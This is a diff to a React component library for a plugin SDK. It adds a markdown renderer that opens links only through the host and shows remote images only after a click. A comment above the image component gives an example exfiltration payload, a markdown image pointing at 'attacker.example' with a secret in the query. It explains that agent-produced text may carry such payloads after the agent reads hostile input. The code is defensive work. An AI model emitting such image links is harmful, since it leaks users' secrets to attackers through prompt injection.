@@ -14,8 +14,12 @@ import { Select as BaseSelect } from "@base-ui/react/select";
 import { Tabs as BaseTabs } from "@base-ui/react/tabs";
 import { Toggle as BaseToggle } from "@base-ui/react/toggle";
 import { ToggleGroup as BaseToggleGroup } from "@base-ui/react/toggle-group";
-import { createContext, createElement as h, useContext, useEffect, useId, useLayoutEffect, useRef, useState } from "react";
+import { createContext, createElement as h, useContext, useEffect, useId, memo, useLayoutEffect, useRef, useState } from "react";
 import { createRoot } from "react-dom/client";
+
+import { MAX_DATA_IMAGE, parseBlocks, parseInline } from "./markdown.js";
+
+export { MAX_DATA_IMAGE };
 
 import { mountShell } from "wings-plugin-sdk/shell";
 
@@ -751,3 +755,119 @@ export function Disclosure({ summary, open, defaultOpen, onOpenChange, children,
     h(BaseCollapsible.Panel, { className: "w-disclosure-panel" }, children),
   );
 }
+
+// ---------- markdown ----------
+
+const openLink = (e, href) => {
+  e.preventDefault();
+  // Needs `permissions.openUrl` in the manifest, like `["https://"]`.
+  wings.openUrl(href).catch(console.error);
+};
+
+/** Parsed inline spans by text, so a render doesn't parse every cell and paragraph again. */
+const inlines = new Map();
+function inlineOf(text) {
+  let parts = inlines.get(text);
+  if (!parts) {
+    parts = parseInline(text);
+    if (inlines.size >= 500) inlines.delete(inlines.keys().next().value);
+    inlines.set(text, parts);
+  }
+  return parts;
+}
+
+/**
+ * A remote image is a button until it's clicked: loading an image tells its server who looked and when, and the text
+ * may come from an agent that read something hostile (`![](https://attacker.example/?d=secret)`). A data: image
+ * carries its own bytes, so it shows at once.
+ */
+function MdImage({ src, alt }) {
+  const [loaded, setLoaded] = useState(false);
+  const img = (h("img", { className: "w-md-image", src, alt, loading: "lazy", decoding: "async", referrerPolicy: "no-referrer" }));
+  if (src.startsWith("data:") || loaded) return img;
+  const host = new URL(src).host;
+  return h("button", { type: "button", className: "w-md-image-load", title: alt || undefined, onClick: () => setLoaded(true) }, `Load image from ${host}`);
+}
+
+function MdInline({ text }) {
+  return inlineOf(text).map((part, i) => {
+    switch (part.kind) {
+      case "code":
+        return h("code", { key: i, className: "w-md-code" }, part.text);
+      case "strong":
+        return h("strong", { key: i }, part.text);
+      case "em":
+        return h("em", { key: i }, part.text);
+      case "del":
+        return h("del", { key: i }, part.text);
+      case "image":
+        return h(MdImage, { key: i, src: part.src, alt: part.alt });
+      case "link":
+        return h("a", { key: i, className: "w-md-link", href: part.href, onClick: (e) => openLink(e, part.href) }, part.text);
+      default:
+        return part.text;
+    }
+  });
+}
+
+/** Parsed blocks by source, so a page that renders many sections only parses the one that changed. */
+const parsed = new Map();
+function blocksOf(source) {
+  let blocks = parsed.get(source);
+  if (!blocks) {
+    blocks = parseBlocks(source);
+    if (parsed.size >= 200) parsed.delete(parsed.keys().next().value);
+    parsed.set(source, blocks);
+  }
+  return blocks;
+}
+
+/**
+ * Markdown as React elements. No HTML is ever parsed; links open through `wings.openUrl` and only when they are
+ * https; images show only from https or small data:image URLs, and an https image loads only when clicked. Re-renders only when `source` changes.
+ */
+export const Markdown = memo(function Markdown({ source, inline, className, ...rest }) {
+  if (inline) return h("span", { ...rest, className: cx("w-md", className) }, h(MdInline, { text: source }));
+  return h(
+    "div",
+    { ...rest, className: cx("w-md", className) },
+    blocksOf(source).map((b, i) => {
+      switch (b.kind) {
+        case "heading":
+          return h(`h${Math.min(b.level + 2, 6)}`, { key: i, className: "w-md-heading", "data-level": Math.min(b.level, 4) }, h(MdInline, { text: b.text }));
+        case "list":
+          return h(
+            b.ordered ? "ol" : "ul",
+            { key: i, className: "w-md-list", "data-ordered": b.ordered ? "" : undefined },
+            b.items.map((item, j) =>
+              h(
+                "li",
+                { key: j, "data-depth": item.depth || undefined, "data-task": item.checked === null ? undefined : "" },
+                item.checked === null ? null : h("input", { type: "checkbox", checked: item.checked, disabled: true, "aria-label": item.checked ? "Done" : "Not done", className: "w-md-check" }),
+                h(MdInline, { text: item.text }),
+              ),
+            ),
+          );
+        case "code":
+          return h("pre", { key: i, className: "w-md-pre" }, h("code", null, b.text));
+        case "quote":
+          return h("blockquote", { key: i, className: "w-md-quote" }, h(MdInline, { text: b.text }));
+        case "rule":
+          return h("hr", { key: i, className: "w-md-rule" });
+        case "table":
+          return h(
+            "div",
+            { key: i, className: "w-md-table-wrap" },
+            h(
+              "table",
+              { className: "w-md-table" },
+              h("thead", null, h("tr", null, b.head.map((c, j) => h("th", { key: j, scope: "col", "data-align": b.align[j] ?? undefined }, h(MdInline, { text: c }))))),
+              h("tbody", null, b.rows.map((row, r) => h("tr", { key: r }, row.map((c, j) => h("td", { key: j, "data-align": b.align[j] ?? undefined }, h(MdInline, { text: c })))))),
+            ),
+          );
+        default:
+          return h("p", { key: i }, h(MdInline, { text: b.text }));
+      }
+    }),
+  );
+});
